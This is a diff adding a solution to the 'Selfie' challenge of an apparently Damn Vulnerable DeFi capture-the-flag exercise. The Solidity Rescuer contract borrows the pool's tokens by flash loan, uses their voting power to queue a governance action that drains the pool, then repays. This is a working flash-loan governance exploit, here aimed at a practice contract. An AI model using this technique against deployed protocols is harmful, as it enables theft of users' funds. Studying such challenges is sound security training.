@@ -62,7 +62,12 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Rescuer rescuer = new Rescuer(token, governance, pool, recovery);
+        rescuer.rescue();
+
+        vm.warp(block.timestamp + governance.getActionDelay() + 12);
+        governance.executeAction(1);
+
     }
 
     /**
@@ -73,4 +78,52 @@ contract SelfieChallenge is Test {
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
+}
+
+contract Rescuer {
+    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
+    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
+
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    DamnValuableVotes token;
+    SimpleGovernance governance;
+    SelfiePool pool;
+    address recovery;
+
+    constructor(
+        DamnValuableVotes _token,
+        SimpleGovernance _governance,
+        SelfiePool _pool,
+        address _recovery
+    ){
+        token = _token;
+        governance = _governance;
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function rescue() external {
+        address(pool).call(
+            abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)",
+                                    address(this),
+                                    address(token),
+                                    TOKENS_IN_POOL,
+                                    "")
+        );
+    }
+
+    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
+        require(token.balanceOf(address(this)) == TOKENS_IN_POOL, "Not enough tokens received");
+        token.delegate(address(this));
+        governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeWithSignature("emergencyExit(address)", recovery)
+        );
+
+        token.approve(address(pool), TOKENS_IN_POOL);
+        return CALLBACK_SUCCESS;
+    }
+
 }
